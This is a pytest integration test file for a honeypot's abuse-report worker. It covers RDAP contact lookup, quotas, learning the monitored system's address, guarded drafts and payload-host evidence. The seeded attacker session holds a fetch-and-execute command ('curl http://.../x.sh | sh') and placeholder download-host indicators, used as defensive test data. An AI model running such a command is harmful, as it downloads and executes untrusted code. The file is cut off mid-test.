"""M22 ingest worker against a real TimescaleDB: contact lookup (quota, caches, gate), learning of
the monitored system's address, demo events to a guarded draft, dedupe, reviewed drafts and the
API's requests. No test opens a connection: the HTTP client is a MockTransport behind the same
gate, quota and host rules as production."""

import json
import os
from datetime import UTC, datetime, timedelta
from typing import Any

import httpx
import pytest
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine, AsyncSession, async_sessionmaker

from ingest.abuse import AbuseSettings, AbuseWorker
from ingest.abuse.bootstrap import Bootstrap
from ingest.abuse.build import DEMO_MAILBOX, DraftBuilder
from ingest.abuse.contacts import ContactResolver, make_reserve
from ingest.abuse.rdap import QuotaExhausted, RdapClient
from ingest.abuse.reguard import DraftReguard
from ingest.abuse.selfterms import TermsCache, learn, self_address_state
from ingest.egress import EgressClosed
from ingest.features import FeatureSettings

from .helpers import fake_gate

pytestmark = [
    pytest.mark.integration,
    pytest.mark.skipif(not os.environ.get("POSTGRES_HOST"), reason="POSTGRES_HOST not set"),
]

Factory = async_sessionmaker[AsyncSession]
RIPE_BASE = "https://rdap.db.ripe.net/"
BOOT = Bootstrap(
    {
        "ipv4": {"services": [[["203.0.113.0/24", "198.51.100.0/24"], [RIPE_BASE]]]},
        "asn": {"services": [[["64496-64511"], [RIPE_BASE]]]},
        "dns": {"services": [[["net"], ["https://rdap.example-registry.net/"]]]},
    }
)
SELF_ADDR = "198.51.100.200"  # the monitored system, a placeholder
ANSWER = {
    "handle": "EX-1",
    "name": "EXAMPLE-NET",
    "country": "nl",
    "cidr0_cidrs": [{"v4prefix": "203.0.113.0", "length": 24}],
    "entities": [
        {
            "roles": ["abuse"],
            "vcardArray": [
                "vcard",
                [["fn", {}, "text", "Example Abuse"], ["email", {}, "text", "abuse@example.org"]],
            ],
        }
    ],
}


class Wire:
    """A fake RDAP server that counts requests."""

    def __init__(self, answer: Any = ANSWER, status: int = 200) -> None:
        self.answer, self.status = answer, status
        self.requests: list[str] = []

    def __call__(self, req: httpx.Request) -> httpx.Response:
        self.requests.append(str(req.url))
        if self.status != 200:
            return httpx.Response(self.status)
        return httpx.Response(200, json=self.answer)


def resolver(
    factory: Factory, wire: Wire, settings: AbuseSettings, *, open_: bool = True
) -> ContactResolver:
    http = httpx.AsyncClient(transport=httpx.MockTransport(wire), follow_redirects=False)
    rdap = RdapClient(
        make_reserve(factory, settings), BOOT.hosts, gate=fake_gate(open_=open_), client=http,
        host_spacing_s=0,
    )  # fmt: skip
    return ContactResolver(factory, rdap, BOOT)


async def scalar(engine: AsyncEngine, sql: str, **params: Any) -> Any:
    async with engine.connect() as conn:
        return (await conn.execute(text(sql), params)).scalar()


async def rows(engine: AsyncEngine, sql: str, **params: Any) -> list[Any]:
    async with engine.connect() as conn:
        return list((await conn.execute(text(sql), params)).all())


@pytest.fixture(autouse=True)
async def _owner_wording(engine: AsyncEngine) -> None:
    """The owner has set a reply contact and some wording (the package ships none)."""
    async with engine.begin() as conn:
        await conn.execute(
            text(
                "INSERT INTO report_settings (id, reply_contact, intro, outro, note, subject_template) "
                "VALUES (1, 'reports@example.org', 'Intro written by the owner.', 'Outro.', "
                "'Note.', 'Abuse report {value}') "
                "ON CONFLICT (id) DO NOTHING"
            )
        )


# -- contact lookup --------------------------------------------------------------------


async def test_lookup_stores_the_network_and_caches_it(
    engine: AsyncEngine, factory: Factory
) -> None:
    wire, s = Wire(), AbuseSettings()
    r = resolver(factory, wire, s)
    first = await r.resolve_ip("203.0.113.9", None)
    assert first.status == "found" and first.mailboxes == ("abuse@example.org",)
    assert first.network_name == "EXAMPLE-NET" and first.country == "NL"
    assert len(wire.requests) == 1 and wire.requests[0].startswith(RIPE_BASE + "ip/203.0.113.9")
    # same address: lookup row. Another address of the same block: network cache. No request.
    await r.resolve_ip("203.0.113.9", None)
    other = await r.resolve_ip("203.0.113.77", None)
    assert other.status == "found" and len(wire.requests) == 1
    assert await scalar(engine, "SELECT used FROM enrichment_quota WHERE provider = 'rdap'") == 1
    assert await scalar(engine, "SELECT cidr::text FROM abuse_networks") == "203.0.113.0/24"
    assert await scalar(engine, "SELECT count(*) FROM abuse_lookups") == 2


async def test_gate_is_checked_before_quota_and_nothing_is_cached(
    engine: AsyncEngine, factory: Factory
) -> None:
    wire = Wire()
    r = resolver(factory, wire, AbuseSettings(), open_=False)
    with pytest.raises(EgressClosed):
        await r.resolve_ip("203.0.113.9", None)
    assert not wire.requests
    assert await scalar(engine, "SELECT count(*) FROM enrichment_quota") == 0
    assert await scalar(engine, "SELECT count(*) FROM abuse_lookups") == 0
    assert (await r.resolve_ip("203.0.113.9", None, cache_only=True)).status == "pending"


async def test_hourly_quota_is_a_hard_stop(engine: AsyncEngine, factory: Factory) -> None:
    wire = Wire(status=503)
    r = resolver(factory, wire, AbuseSettings(rdap_hourly_quota=1))
    assert (await r.resolve_ip("203.0.113.1", None)).status == "pending"  # spends the one unit
    with pytest.raises(QuotaExhausted):
        await r.resolve_ip("198.51.100.1", None)
    assert len(wire.requests) == 1


async def test_errors_back_off_and_empty_answers_are_cached_negatively(
    engine: AsyncEngine, factory: Factory
) -> None:
    down = Wire(status=503)
    r = resolver(factory, down, AbuseSettings())
    assert (await r.resolve_ip("203.0.113.1", None)).status == "pending"
    assert (await r.resolve_ip("203.0.113.1", None)).status == "pending"
    assert len(down.requests) == 1  # backed off 15 minutes
    row = (await rows(engine, "SELECT status, attempts, next_check_at FROM abuse_lookups"))[0]
    assert (row.status, row.attempts) == ("error", 1)
    assert row.next_check_at > datetime.now(UTC) + timedelta(minutes=10)

    empty = Wire(answer={"handle": "X", "name": "Y", "entities": []})
    r2 = resolver(factory, empty, AbuseSettings())
    assert (await r2.resolve_ip("198.51.100.5", None)).status == "no_contact"
    assert (await r2.resolve_ip("198.51.100.5", None)).status == "no_contact"
    # the registry, then RIPEstat for the RIPE region; the second call is served from the cache
    assert len(empty.requests) == 2


async def test_domain_goes_to_the_registrar_through_the_tld_server(
    engine: AsyncEngine, factory: Factory
) -> None:
    wire = Wire()
    out = await resolver(factory, wire, AbuseSettings()).resolve_domain("cdn.evil.example.net")
    assert out.status == "found"
    assert wire.requests == ["https://rdap.example-registry.net/domain/example.net"]
    assert await scalar(engine, "SELECT domain FROM abuse_networks") == "example.net"


# -- learning the monitored system's address ------------------------------------------------


async def add_http(
    engine: AsyncEngine, n: int, host: str, minutes_ago: int = 20, first: int = 10
) -> None:
    async with engine.begin() as conn:
        for i in range(n):
            await conn.execute(
                text(
                    "INSERT INTO events (ts, sensor, session_id, type, src_ip, src_port, dst_port, data) "
                    "VALUES (:ts, 'web', :sid, 'http_request', CAST(:ip AS inet), 40000, 8080, "
                    "CAST(:d AS jsonb))"
                ),
                {
                    "ts": datetime.now(UTC) - timedelta(minutes=minutes_ago),
                    "sid": f"learn-{host}-{i}",
                    "ip": f"10.{first + i}.0.9",
                    "d": json.dumps({"host": host, "path": "/"}),
                },
            )


async def test_a_learned_address_is_only_a_pending_suggestion_until_confirmed(
    engine: AsyncEngine, factory: Factory
) -> None:
    await add_http(engine, 1, "8.8.4.4")
    assert await learn(factory) == 0  # one source network is not enough
    await add_http(engine, 2, "8.8.4.4", first=20)
    assert await learn(factory) == 1
    row = (
        await rows(
            engine, "SELECT kind, value, source, distinct_sources, confirmed FROM report_self_terms"
        )
    )[0]
    assert (row.kind, row.value, row.source, row.distinct_sources, row.confirmed) == (
        "address", "8.8.4.4", "learned", 3, False,
    )  # fmt: skip
    state = await self_address_state(factory)
    assert state == {"self_address_fresh": False, "self_terms_pending": 1}
    assert (await TermsCache(factory, {}).get()).has_self_address is False  # type: ignore[union-attr]
    async with engine.begin() as conn:  # the owner confirms it in the UI
        await conn.execute(text("UPDATE report_self_terms SET confirmed = true"))
    assert (await TermsCache(factory, {}).get()).has_self_address is True  # type: ignore[union-attr]
    assert (await self_address_state(factory))["self_address_fresh"] is True
    async with engine.begin() as conn:  # not seen for four days: no longer a fresh address
        await conn.execute(
            text("UPDATE report_self_terms SET last_seen = now() - interval '4 days'")
        )
    assert (await self_address_state(factory))["self_address_fresh"] is False


async def test_sources_in_one_network_count_once(engine: AsyncEngine, factory: Factory) -> None:
    async with engine.begin() as conn:
        for i in range(5):
            await conn.execute(
                text(
                    "INSERT INTO events (ts, sensor, session_id, type, src_ip, src_port, dst_port, "
                    "data) VALUES (now() - interval '10 minutes', 'web', :s, 'http_request', "
                    "CAST(:ip AS inet), 1, 8080, CAST(:d AS jsonb))"
                ),
                {"s": f"farm-{i}", "ip": f"10.9.9.{i + 1}", "d": json.dumps({"host": "8.8.4.4"})},
            )
    assert await learn(factory) == 0


async def test_attackers_and_reported_hosts_are_never_learned(
    engine: AsyncEngine, factory: Factory
) -> None:
    await add_http(engine, 3, "8.8.4.4")
    await add_http(engine, 3, "evil.example.net", first=40)
    async with engine.begin() as conn:
        # 8.8.4.4 is itself a source that attacked us; the name is a reported payload host.
        await conn.execute(
            text(
                "INSERT INTO events (ts, sensor, session_id, type, src_ip, src_port, dst_port, data) "
                "VALUES (now(), 'ssh', 'x', 'connect', '8.8.4.4', 1, 2222, '{}')"
            )
        )
        await conn.execute(
            text(
                "INSERT INTO indicators (type, value, role, host, first_seen, last_seen) VALUES "
                "('url', 'http://evil.example.net/a', 'download_host', 'evil.example.net', now(), now())"
            )
        )
    assert await learn(factory) == 0
    assert await scalar(engine, "SELECT count(*) FROM report_self_terms") == 0


async def test_artefact_vocabulary_names_are_not_learned(
    engine: AsyncEngine, factory: Factory
) -> None:
    await add_http(engine, 3, "report.mydomain.net")
    await learn(factory)
    assert await scalar(engine, "SELECT count(*) FROM report_self_terms") == 0


async def test_scan_is_capped_per_source_and_matches_the_host_exactly(
    engine: AsyncEngine, factory: Factory
) -> None:
    await add_http(engine, 3, "8.8.4.4", first=60)
    await add_http(engine, 3, "8.8.4.44", first=70)  # must not count towards 8.8.4.4
    await learn(factory)
    got = {
        r.value: r.distinct_sources
        for r in await rows(engine, "SELECT value, distinct_sources FROM report_self_terms")
    }
    assert got == {"8.8.4.4": 3, "8.8.4.44": 3}


async def test_sensor_identity_names_are_upserted_from_the_sensors_own_connect(
    engine: AsyncEngine, factory: Factory
) -> None:
    from ingest.abuse import identity
    from ingest.writer import write_batch

    from .helpers import make_event

    identity._recent.clear()
    good = {"self_identity": {"names": ["SRV-FILE01", "corp.example", "bad name!", 5]}}
    evs = [
        make_event("connect", sid="a", sensor="smb", data=good),
        make_event(
            "connect", sid="b", sensor="ssh", data={"self_identity": {"names": ["srv-ssh"]}}
        ),
        make_event("command", sid="c", sensor="smb", data=good),
        make_event("connect", sid="d", sensor="rdp", data={"self_identity": {"names": ["a"] * 9}}),
        make_event("connect", sid="e", sensor="mssql", data={"names": ["srv-sql"]}),
    ]
    await write_batch(factory, evs)
    got = await rows(
        engine, "SELECT value, source, confirmed FROM report_self_terms ORDER BY value"
    )
    assert [(r.value, r.source, r.confirmed) for r in got] == [
        ("corp.example", "sensor", True), ("srv-file01", "sensor", True),
    ]  # fmt: skip
    terms = await TermsCache(factory, {}).get()
    assert terms is not None and any(n.value == "srv-file01" for n in terms.names)


async def test_manual_entries_are_never_overwritten(engine: AsyncEngine, factory: Factory) -> None:
    async with engine.begin() as conn:
        await conn.execute(
            text(
                "INSERT INTO report_self_terms (kind, value, source) VALUES ('address', '8.8.4.4', 'manual')"
            )
        )
    await add_http(engine, 4, "8.8.4.4")
    await learn(factory)
    row = (await rows(engine, "SELECT source, distinct_sources FROM report_self_terms"))[0]
    assert (row.source, row.distinct_sources) == ("manual", 0)


async def test_private_and_documentation_hosts_are_not_learned(
    engine: AsyncEngine, factory: Factory
) -> None:
    await add_http(engine, 3, "172.16.1.10")  # gitleaks:allow
    await add_http(engine, 3, "203.0.113.77")
    await learn(factory)
    assert await scalar(engine, "SELECT count(*) FROM report_self_terms") == 0


# -- drafts -----------------------------------------------------------------------------

DEMO_IP = "203.0.113.50"
NOW = datetime.now(UTC)


async def seed_attack(
    engine: AsyncEngine, ip: str = DEMO_IP, ago_h: float = 3, logins: int = 60
) -> str:
    sid = f"sess-{ip}-{ago_h}"
    start = NOW - timedelta(hours=ago_h)
    async with engine.begin() as conn:
        await conn.execute(
            text(
                "INSERT INTO sessions (session_id, sensor, src_ip, src_port, dst_port, started_at, "
                "last_event_at, event_count, login_attempts, login_success, commands, asn, country) "
                "VALUES (:sid, 'ssh', CAST(:ip AS inet), 41000, 2222, :s, :e, :n, :l, true, 2, 64496, 'NL') "
                "ON CONFLICT (session_id) DO NOTHING"
            ),
            {
                "sid": sid,
                "ip": ip,
                "s": start,
                "e": start + timedelta(minutes=5),
                "n": logins + 3,
                "l": logins,
            },
        )
        events: list[tuple[str, dict[str, Any], float]] = [
            *[
                ("login_attempt", {"username": "root", "password": "x", "success": False}, i)
                for i in range(5)
            ],
            ("login_attempt", {"username": "root", "password": "y", "success": True}, 6),
            ("command", {"input": "uname -a"}, 10),
            ("command", {"input": f"curl http://{SELF_ADDR}/x.sh | sh"}, 20),
        ]
        for kind, data, off in events:
            await conn.execute(
                text(
                    "INSERT INTO events (ts, sensor, session_id, type, src_ip, src_port, dst_port, data) "
                    "VALUES (:ts, 'ssh', :sid, :t, CAST(:ip AS inet), 41000, 2222, CAST(:d AS jsonb))"
                ),
                {
                    "ts": start + timedelta(seconds=off),
                    "sid": sid,
                    "t": kind,
                    "ip": ip,
                    "d": json.dumps(data),
                },
            )
    return sid


def builder(factory: Factory, settings: AbuseSettings) -> DraftBuilder:
    r = resolver(factory, Wire(), settings)
    return DraftBuilder(factory, settings, TermsCache(factory, {}), r)


async def add_self_address(engine: AsyncEngine) -> None:
    async with engine.begin() as conn:
        await conn.execute(
            text(
                "INSERT INTO report_self_terms (kind, value, source) VALUES ('address', :a, 'manual')"
            ),
            {"a": SELF_ADDR},
        )


DEMO = AbuseSettings(include_demo=True)


async def test_demo_events_become_a_guarded_draft(engine: AsyncEngine, factory: Factory) -> None:
    sid = await seed_attack(engine)
    b = builder(factory, DEMO)

    # No confirmed self address: the draft exists but the guard blocks it (fail closed).
    stats = await b.run(NOW, allow_lookups=False)
    assert stats.created == 1 and stats.guard_failed == 1
    rep = (await rows(engine, "SELECT guard_ok, guard_codes, demo, status FROM abuse_reports"))[0]
    assert rep.guard_ok is False and "no_self_address" in rep.guard_codes
    assert rep.demo is True and rep.status == "draft"

    await add_self_address(engine)
    b.terms._terms = None  # the 60 s cache would hide the new row
    stats = await b.run(NOW, allow_lookups=False)
    assert (stats.created, stats.updated, stats.guard_failed) == (0, 1, 0)
    rep = (await rows(engine, "SELECT * FROM abuse_reports"))[0]
    assert rep.guard_ok is True and rep.guard_codes == []
    assert rep.subject_count == 1 and rep.options["time_precision"] == "minute"
    assert await scalar(engine, "SELECT mailbox FROM abuse_recipients") == DEMO_MAILBOX

    blob = json.dumps(rep.evidence)
    assert SELF_ADDR not in blob and sid not in blob and "ssh_sensor" not in blob
    assert "password" not in blob and '"x"' not in blob
    actions = [a["action"] for a in rep.evidence["subjects"][0]["activities"]]
    assert "failed_logins" in actions and "login_then_commands" in actions
    assert rep.redaction["lines_dropped"] >= 1  # the command that named the monitored address
    sub = (await rows(engine, "SELECT value, subject_type, sessions FROM abuse_report_subjects"))[0]
    assert (sub.value, sub.subject_type) == (DEMO_IP, "ip")
    # failed logins are aggregated and shown on the public port, not the container's
    fail = next(
        a for a in rep.evidence["subjects"][0]["activities"] if a["action"] == "failed_logins"
    )
    assert (fail["count"], fail["dst_port"], fail["service"]) == (5, 22, "ssh")

    # nothing new: nothing written
    revision = rep.revision
    stats = await b.run(NOW, allow_lookups=False)
    assert (stats.created, stats.updated) == (0, 0)
    assert await scalar(engine, "SELECT revision FROM abuse_reports") == revision


async def test_missing_reply_contact_blocks_the_draft_instead_of_crashing(
    engine: AsyncEngine, factory: Factory
) -> None:
    await seed_attack(engine)
    await add_self_address(engine)
    async with engine.begin() as conn:
        await conn.execute(text("UPDATE report_settings SET reply_contact = NULL"))
    stats = await builder(factory, DEMO).run(NOW, allow_lookups=False)
    assert (stats.created, stats.guard_failed) == (1, 1)
    rep = (await rows(engine, "SELECT guard_ok, guard_codes FROM abuse_reports"))[0]
    assert rep.guard_ok is False and "settings_incomplete" in rep.guard_codes


async def set_wording(
    engine: AsyncEngine,
    *,
    reply_contact: str = "reports@example.org",
    intro: str = "Intro written by the owner.",
) -> None:
    """Change the owner's wording the way the API does: new text, revision plus one."""
    async with engine.begin() as conn:
        await conn.execute(
            text(
                "UPDATE report_settings SET reply_contact = :c, intro = :i, revision = revision + 1"
            ),
            {"c": reply_contact, "i": intro},
        )


async def test_drafts_are_rechecked_after_the_wording_changes(
    engine: AsyncEngine, factory: Factory
) -> None:
    await seed_attack(engine)
    await add_self_address(engine)
    # A reply contact that names the project blocks every draft.
    await set_wording(engine, reply_contact="reports@honeypot.example.net")
    await builder(factory, DEMO).run(NOW, allow_lookups=False)
    first = (
        await rows(
            engine, "SELECT guard_ok, guard_codes, revision, content_sha256 FROM abuse_reports"
        )
    )[0]
    assert first.guard_ok is False and "project_term" in first.guard_codes

    reguard = DraftReguard(factory, DEMO, TermsCache(factory, {}))
    stats = await reguard.run_if_changed()  # the first pass after a start
    assert stats is not None and (stats.checked, stats.changed) == (1, 0)
    assert await reguard.run_if_changed() is None  # nothing changed since

    # The owner fixes the reply contact: the draft is clear within one cycle, nothing else moves.
    await set_wording(engine)
    stats = await reguard.run_if_changed()
    assert stats is not None and (stats.checked, stats.changed, stats.unblocked) == (1, 1, 1)
    fixed = (
        await rows(
            engine, "SELECT guard_ok, guard_codes, revision, content_sha256 FROM abuse_reports"
        )
    )[0]
    assert fixed.guard_ok is True and fixed.guard_codes == []
    assert (fixed.revision, fixed.content_sha256) == (first.revision, first.content_sha256)

    # Wording that was once a shipped default blocks it again, with a constant code.
    await set_wording(engine, intro="Please investigate and stop this activity.")
    stats = await reguard.run_if_changed()
    assert stats is not None and (stats.changed, stats.blocked) == (1, 1)
    again = (await rows(engine, "SELECT guard_ok, guard_codes FROM abuse_reports"))[0]
    assert again.guard_ok is False and "default_wording" in again.guard_codes

    # A reviewed report is never touched by the pass.
    async with engine.begin() as conn:
        await conn.execute(text("UPDATE abuse_reports SET status = 'reviewed'"))
    await set_wording(engine)
    stats = await reguard.run_if_changed()
    assert stats is not None and stats.checked == 0
    assert await scalar(engine, "SELECT guard_ok FROM abuse_reports") is False


async def test_reviewed_drafts_are_untouched_and_new_evidence_waits(
    engine: AsyncEngine, factory: Factory
) -> None:
    await seed_attack(engine)
    await add_self_address(engine)
    b = builder(factory, DEMO)
    await b.run(NOW, allow_lookups=False)
    async with engine.begin() as conn:
        await conn.execute(
            text(
                "UPDATE abuse_reports SET status = 'reviewed', reviewed_at = now(), "
                "reviewed_by = 'owner', reviewed_revision = revision"
            )
        )
    before = (await rows(engine, "SELECT revision, content_sha256 FROM abuse_reports"))[0]
    await seed_attack(engine, ago_h=2)  # new activity of the same source
    stats = await b.run(NOW, allow_lookups=False)
    assert (stats.created, stats.updated) == (0, 0)
    after = (await rows(engine, "SELECT revision, content_sha256, status FROM abuse_reports"))[0]
    assert (after.revision, after.content_sha256, after.status) == (
        before.revision,
        before.content_sha256,
        "reviewed",
    )
    assert await scalar(engine, "SELECT count(*) FROM abuse_reports") == 1


async def test_sent_reports_set_a_cooldown_and_new_activity_after_it_opens_a_new_draft(
    engine: AsyncEngine, factory: Factory, monkeypatch: pytest.MonkeyPatch
) -> None:
    # A demo report can never be sent, so this runs the real path (RDAP contact, demo=false).
    monkeypatch.setattr("ingest.abuse.candidates.origin_of_ip", lambda *a, **k: "real")
    await seed_attack(engine, ago_h=30)
    await add_self_address(engine)
    b = DraftBuilder(factory, DEMO, TermsCache(factory, {}), resolver(factory, Wire(), DEMO))
    await b.run(NOW - timedelta(hours=1), allow_lookups=True)
    async with engine.begin() as conn:
        await conn.execute(
            text(
                "UPDATE abuse_reports SET status = 'reviewed', reviewed_at = now(), "
                "reviewed_by = 'o', reviewed_revision = revision"
            )
        )
        await conn.execute(
            text("UPDATE abuse_reports SET status = 'sent', sent_at = now(), sent_by = 'o'")
        )
    await seed_attack(engine, ago_h=2)
    stats = await b.run(NOW, allow_lookups=True)
    assert stats.created == 0  # inside the 14 day cooldown
    async with engine.begin() as conn:
        await conn.execute(text("UPDATE abuse_reports SET sent_at = now() - interval '20 days'"))
    stats = await b.run(NOW, allow_lookups=True)
    assert stats.created == 1
    new = (await rows(engine, "SELECT evidence, status FROM abuse_reports WHERE status = 'draft'"))[
        0
    ]
    assert new.evidence["subjects"][0]["previously_reported"] is not None


async def test_muted_recipients_get_no_draft(engine: AsyncEngine, factory: Factory) -> None:
    await seed_attack(engine)
    async with engine.begin() as conn:
        await conn.execute(
            text("INSERT INTO abuse_recipients (mailbox, source, muted) VALUES (:m, 'rdap', true)"),
            {"m": DEMO_MAILBOX},
        )
    stats = await builder(factory, DEMO).run(NOW, allow_lookups=False)
    assert stats.created == 0
    assert await scalar(engine, "SELECT count(*) FROM abuse_reports") == 0


async def test_demo_sources_are_ignored_unless_demo_reports_are_on(
    engine: AsyncEngine, factory: Factory
) -> None:
    await seed_attack(engine)
    stats = await builder(factory, AbuseSettings()).run(NOW, allow_lookups=False)
    assert stats.selected == 0 and await scalar(engine, "SELECT count(*) FROM abuse_reports") == 0


async def test_benign_sessions_and_recent_ones_are_not_selected(
    engine: AsyncEngine, factory: Factory
) -> None:
    await seed_attack(engine, ip="203.0.113.60", ago_h=3)
    await seed_attack(engine, ip="203.0.113.61", ago_h=0.1)  # still running
    async with engine.begin() as conn:
        await conn.execute(text("UPDATE sessions SET benign = true WHERE src_ip = '203.0.113.60'"))
    stats = await builder(factory, DEMO).run(NOW, allow_lookups=False)
    assert stats.selected == 0


async def test_real_source_resolves_its_contact_then_drafts(
    engine: AsyncEngine, factory: Factory, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A documentation address stands in for a public one: the RDAP path end to end."""
    monkeypatch.setattr("ingest.abuse.candidates.origin_of_ip", lambda *a, **k: "real")
    await seed_attack(engine, ip="203.0.113.70")
    wire = Wire()
    b = DraftBuilder(factory, DEMO, TermsCache(factory, {}), resolver(factory, wire, DEMO))
    stats = await b.run(NOW, allow_lookups=True)
    assert (stats.created, stats.resolved) == (1, 1)
    rep = (await rows(engine, "SELECT recipient_id, demo, evidence FROM abuse_reports"))[0]
    assert rep.demo is False and rep.evidence["recipient"] == "abuse@example.org"
    assert rep.evidence["subjects"][0]["network"] == "EXAMPLE-NET"
    assert rep.evidence["subjects"][0]["asn"] == 64496
    assert await scalar(engine, "SELECT mailbox FROM abuse_recipients") == "abuse@example.org"
    assert await scalar(engine, "SELECT name FROM abuse_recipients") == "Example Abuse"
    await b.run(NOW, allow_lookups=True)
    assert len(wire.requests) == 1  # cached


async def test_a_closed_gate_defers_the_lookup_without_spending_anything(
    engine: AsyncEngine, factory: Factory, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("ingest.abuse.candidates.origin_of_ip", lambda *a, **k: "real")
    await seed_attack(engine, ip="203.0.113.71")
    wire = Wire()
    r = resolver(factory, wire, DEMO, open_=False)
    stats = await DraftBuilder(factory, DEMO, TermsCache(factory, {}), r).run(
        NOW, allow_lookups=True
    )
    assert stats.waiting_egress and stats.created == 0 and not wire.requests
    assert await scalar(engine, "SELECT count(*) FROM enrichment_quota") == 0
    assert await scalar(engine, "SELECT count(*) FROM abuse_lookups") == 0
    stats = await DraftBuilder(factory, DEMO, TermsCache(factory, {}), r).run(
        NOW, allow_lookups=False
    )
    assert stats.waiting_egress and stats.created == 0  # cache only: nothing cached yet


# -- requests from the API -----------------------------------------------------------------


def worker(factory: Factory, wire: Wire) -> AbuseWorker:
    http = httpx.AsyncClient(transport=httpx.MockTransport(wire), follow_redirects=False)
    return AbuseWorker(
        FeatureSettings.from_env({"ABUSE_REPORTS_ENABLED": "true"}), factory,
        abuse=DEMO, env={}, gate=fake_gate(), client=http, host_spacing_s=0,
    )  # fmt: skip


async def test_requests_are_answered_and_regenerate_refuses_reviewed(
    engine: AsyncEngine, factory: Factory
) -> None:
    await seed_attack(engine)
    await add_self_address(engine)
    w = worker(factory, Wire())
    await w.run_once()
    rid = await scalar(engine, "SELECT id FROM abuse_reports")
    async with engine.begin() as conn:
        await conn.execute(
            text(
                "INSERT INTO abuse_lookups (subject, kind, status, next_check_at) "
                "VALUES ('192.0.2.99', 'ip', 'no_contact', now() + interval '1 day')"
            )
        )
        await conn.execute(
            text(
                "INSERT INTO abuse_report_requests (report_id, action, requested_by) "
                "VALUES (:r, 'regenerate', 'owner'), (NULL, 'lookup_again', 'owner')"
            ),
            {"r": rid},
        )
    assert await w.handle_requests() is True
    done = await rows(
        engine, "SELECT action, outcome, done_at FROM abuse_report_requests ORDER BY id"
    )
    assert [(d.action, d.outcome) for d in done] == [("regenerate", "ok"), ("lookup_again", "ok")]
    assert all(d.done_at is not None for d in done)
    assert await scalar(
        engine, "SELECT next_check_at < now() + interval '1 minute' FROM abuse_lookups"
    )

    async with engine.begin() as conn:
        await conn.execute(
            text(
                "UPDATE abuse_reports SET status = 'reviewed', reviewed_at = now(), "
                "reviewed_by = 'o', reviewed_revision = revision"
            )
        )
        await conn.execute(
            text(
                "INSERT INTO abuse_report_requests (report_id, action, requested_by) "
                "VALUES (:r, 'regenerate', 'owner')"
            ),
            {"r": rid},
        )
    assert await w.handle_requests() is False
    outcomes = [
        r.outcome
        for r in await rows(engine, "SELECT outcome FROM abuse_report_requests ORDER BY id")
    ]
    assert outcomes[-1] == "not_draft"


async def test_worker_status_reports_quota_and_gate(engine: AsyncEngine, factory: Factory) -> None:
    w = worker(factory, Wire())
    await w.run_once()
    status = await w.status()
    assert set(status) == {"abuse", "rdap"}
    assert status["rdap"]["daily_quota"] == 1000 and status["rdap"]["egress_open"] is True
    assert status["abuse"]["enabled"] is True and status["abuse"]["last_error"] is None
    assert status["abuse"]["self_address_fresh"] is False  # nothing known yet: reports are blocked


# -- waiting recipients ---------------------------------------------------------------------


async def test_a_network_without_contact_waits_for_the_owner(
    engine: AsyncEngine, factory: Factory, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("ingest.abuse.candidates.origin_of_ip", lambda *a, **k: "real")
    await seed_attack(engine, ip="198.51.100.5")
    wire = Wire(answer={"handle": "X", "name": "Quiet Net", "entities": []})
    b = DraftBuilder(factory, DEMO, TermsCache(factory, {}), resolver(factory, wire, DEMO))
    stats = await b.run(NOW, allow_lookups=True)
    assert (stats.no_contact, stats.created) == (1, 0)
    waiting = await rows(
        engine,
        "SELECT id, name FROM abuse_recipients WHERE mailbox IS NULL AND override_mailbox IS NULL",
    )
    assert [w.name for w in waiting] == ["Quiet Net"]
    assert await scalar(engine, "SELECT recipient_id FROM abuse_networks") == waiting[0].id
    await b.run(NOW, allow_lookups=True)  # reused, not duplicated
    assert await scalar(engine, "SELECT count(*) FROM abuse_recipients") == 1
    # the API sets the override: the next cycle drafts to it, with no new lookup
    async with engine.begin() as conn:
        await conn.execute(
            text("UPDATE abuse_recipients SET override_mailbox = 'desk@example.org'")
        )
    n = len(wire.requests)
    stats = await b.run(NOW, allow_lookups=True)
    assert stats.created == 1 and len(wire.requests) == n
    assert (
        await scalar(engine, "SELECT evidence->>'recipient' FROM abuse_reports")
        == "desk@example.org"
    )
    # muted: nothing more is drafted for it
    async with engine.begin() as conn:
        await conn.execute(text("DELETE FROM abuse_reports"))
        await conn.execute(text("UPDATE abuse_recipients SET muted = true"))
    assert (await b.run(NOW, allow_lookups=True)).created == 0


# -- payload evidence ---------------------------------------------------------------------

SHA = "ab" * 32


async def seed_sample(engine: AsyncEngine) -> None:
    async with engine.begin() as conn:
        await conn.execute(
            text(
                "INSERT INTO samples (sha256, sha1, md5, size, kind, family, first_seen, last_seen) "
                "VALUES (:s, :s1, :m, 1234, 'elf', 'mirai', :t, :t)"
            ),
            {"s": SHA, "s1": "cd" * 20, "m": "ef" * 16, "t": NOW - timedelta(hours=3)},
        )


async def test_payload_host_report_carries_the_fetched_sample_hashes(
    engine: AsyncEngine, factory: Factory
) -> None:
    sid = await seed_attack(engine, ip="203.0.113.80")
    await seed_sample(engine)
    seen = NOW - timedelta(hours=3)
    async with engine.begin() as conn:
        iid = await conn.scalar(
            text(
                "INSERT INTO indicators (type, value, role, host, first_seen, last_seen) VALUES "
                "('url', 'http://198.51.100.9/x.sh', 'download_host', '198.51.100.9', :t, :t) "
                "RETURNING id"
            ),
            {"t": seen},
        )
        await conn.execute(
            text(
                "INSERT INTO indicator_sessions (indicator_id, session_id, src_ip, sensor, seen_at) "
                "VALUES (:i, :s, '203.0.113.80', 'ssh', :t)"
            ),
            {"i": iid, "s": sid, "t": seen},
        )
        tid = await conn.scalar(
            text(
                "INSERT INTO fetch_targets (url, scheme, host, status, first_seen) VALUES "
                "('http://198.51.100.9/x.sh', 'http', '198.51.100.9', 'fetched', :t) RETURNING id"
            ),
            {"t": seen},
        )
        await conn.execute(
            text(
                "INSERT INTO sample_sources (sha256, target_id, first_fetched, last_fetched) "
                "VALUES (:s, :t, :n, :n)"
            ),
            {"s": SHA, "t": tid, "n": seen},
        )
    await DraftBuilder(factory, DEMO, TermsCache(factory, {}), resolver(factory, Wire(), DEMO)).run(
        NOW, allow_lookups=False
    )
    ev = await scalar(engine, "SELECT evidence FROM abuse_reports WHERE kind = 'payload_host'")
    sub = ev["subjects"][0]
    assert sub["value"] == "198.51.100.9"
    assert [s["sha256"] for s in sub["samples"]] == [SHA] and sub["samples"][0]["family"] == "mirai"
    assert sid not in json.dumps(ev)


async def test_c2_from_analysed_samples_is_reported_with_its_hashes(
    engine: AsyncEngine, factory: Factory
) -> None:
    await seed_sample(engine)
